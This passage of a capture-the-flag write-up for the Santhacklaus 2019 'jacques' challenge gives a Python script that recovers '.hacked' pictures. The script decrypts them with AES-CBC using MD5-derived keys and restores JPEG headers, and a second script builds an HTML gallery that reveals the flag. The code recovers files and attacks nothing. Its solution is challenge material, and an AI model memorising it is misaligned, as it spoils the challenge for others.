+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Thomas Siebel</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Kwon Hyuk-Bin</span><span style="color:#cd5555">&#39;</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>TARGET_DIR = <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">/root/Documents/santhacklaus_2019/jacques/recover_pictures/</span><span style="color:#cd5555">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span style="color:#228b22"># Magic bytes of a jpg file</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>plain_text = <span style="color:#658b00">bytes</span>([<span style="color:#b452cd">0xff</span>, <span style="color:#b452cd">0xd8</span>, <span style="color:#b452cd">0xff</span>, <span style="color:#b452cd">0xe0</span>, <span style="color:#b452cd">0x00</span>, <span style="color:#b452cd">0x10</span>, <span style="color:#b452cd">0x4a</span>, <span style="color:#b452cd">0x46</span>, <span style="color:#b452cd">0x49</span>, <span style="color:#b452cd">0x46</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span style="color:#b452cd">0x00</span>, <span style="color:#b452cd">0x01</span>, <span style="color:#b452cd">0x01</span>, <span style="color:#b452cd">0x01</span>, <span style="color:#b452cd">0x00</span>, <span style="color:#b452cd">0x48</span>])
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">decrypt_file</span>(path, key, target):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>    <span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(path, <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">rb</span><span style="color:#cd5555">&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> fi:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>        head, tail = os.path.split(path)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span>        <span style="color:#8b008b;font-weight:bold">with</span> <span style="color:#658b00">open</span>(head + f<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">/</span><span style="color:#cd5555">{target}</span><span style="color:#cd5555">/</span><span style="color:#cd5555">{tail}</span><span style="color:#cd5555">.jpg</span><span style="color:#cd5555">&#39;</span>, <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">wb</span><span style="color:#cd5555">&#39;</span>) <span style="color:#8b008b;font-weight:bold">as</span> fo:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span>            cip = AES.new(key, AES.MODE_CBC)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span>            cipherblocks = fi.read()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span>            message = cip.decrypt(cipherblocks)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span>            message = plain_text + message[<span style="color:#b452cd">16</span>:]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span>            fo.write(message)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span><span style="color:#8b008b;font-weight:bold">for</span> directory, _, filenames <span style="color:#8b008b">in</span> os.walk(TARGET_DIR):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span>    <span style="color:#8b008b;font-weight:bold">for</span> filename <span style="color:#8b008b">in</span> filenames:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span>        <span style="color:#8b008b;font-weight:bold">if</span> <span style="color:#8b008b">not</span> filename.endswith(<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">.hacked</span><span style="color:#cd5555">&#39;</span>):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span>            <span style="color:#8b008b;font-weight:bold">continue</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52</span>        full_path = os.path.join(directory, filename)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53</span>        <span style="color:#658b00">print</span>(<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">Decrypting</span><span style="color:#cd5555">&#39;</span>, full_path)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54</span>        <span style="color:#8b008b;font-weight:bold">for</span> target <span style="color:#8b008b">in</span> TARGETS:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55</span>            folder_name = target.decode(<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">utf-8</span><span style="color:#cd5555">&#39;</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56</span>            target_path = os.path.join(TARGET_DIR, folder_name)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57</span>            <span style="color:#8b008b;font-weight:bold">if</span> <span style="color:#8b008b">not</span> os.path.exists(target_path):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58</span>                os.makedirs(target_path)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59</span>            hsh = hashlib.new(<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">md5</span><span style="color:#cd5555">&#39;</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60</span>            hsh.update(target)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61</span>            key = hsh.digest()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62</span>            decrypt_file(full_path, key, folder_name)
+</code></pre></div><p>After making this, we need to make a quick script to create a html document that will be easily visualized:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#228b22">#!/usr/bin/python3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">os</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#8b008b;font-weight:bold">from</span> <span style="color:#008b45;text-decoration:underline">urllib</span><span style="color:#008b45;text-decoration:underline">.</span><span style="color:#008b45;text-decoration:underline">parse</span> <span style="color:#8b008b;font-weight:bold">import</span> quote
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>TARGET_DIR = <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">/root/Documents/santhacklaus_2019/jacques/recover_pictures/</span><span style="color:#cd5555">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>html = <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">&lt;html&gt;&lt;body&gt;</span><span style="color:#cd5555">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#8b008b;font-weight:bold">for</span> directory, _, filenames <span style="color:#8b008b">in</span> os.walk(TARGET_DIR):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    <span style="color:#8b008b;font-weight:bold">for</span> filename <span style="color:#8b008b">in</span> filenames:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>        <span style="color:#8b008b;font-weight:bold">if</span> filename.endswith(<span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">.jpg</span><span style="color:#cd5555">&#39;</span>):
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>            full_path = os.path.join(directory, filename)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>            html+= f<span style="color:#cd5555"></span><span style="color:#cd5555">&#34;</span><span style="color:#cd5555">&lt;img src=</span><span style="color:#cd5555">{</span><span style="color:#cd5555">quote(full_path)} /&gt;</span><span style="color:#cd5555">&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>html += <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">&lt;/body&gt;</span><span style="color:#cd5555">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>html += <span style="color:#cd5555"></span><span style="color:#cd5555">&#39;</span><span style="color:#cd5555">&lt;/html&gt;</span><span style="color:#cd5555">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#658b00">print</span>(html)
+</code></pre></div><div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; ./recover.py
+&gt; ./make_html.py &gt; images.html
+</code></pre></div><p>The <code>images.html</code> has only 4 valid images. One of them is:</p>
+<p><img src="/images/jacques/DCIM-0534.jpg.hacked.jpg" alt="We find the flag"></p>
+
+    <a href="/"> >> Home</a>
+  </main>
+</div>
+    <footer>
+      
+<script>
+(function() {
+  function center_el(tagName) {
+    var tags = document.getElementsByTagName(tagName), i, tag;
+    for (i = 0; i < tags.length; i++) {
+      tag = tags[i];
+      var parent = tag.parentElement;
+      
+      if (parent.childNodes.length === 1) {
+        
+        if (parent.nodeName === 'A') {
+          parent = parent.parentElement;
+          if (parent.childNodes.length != 1) continue;
+        }
+        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
+      }
+    }
+  }
+  var tagNames = ['img', 'embed', 'object'];
+  for (var i = 0; i < tagNames.length; i++) {
+    center_el(tagNames[i]);
+  }
+})();
+</script>
+
+      
+      <hr/>
+      <a href="https://github.com/louiswolfers">GitHub</a> | <a href="https://twitter.com/TG91aXMK">Twitter</a>
+      
+    </footer>
+  </body>
+</html>
+
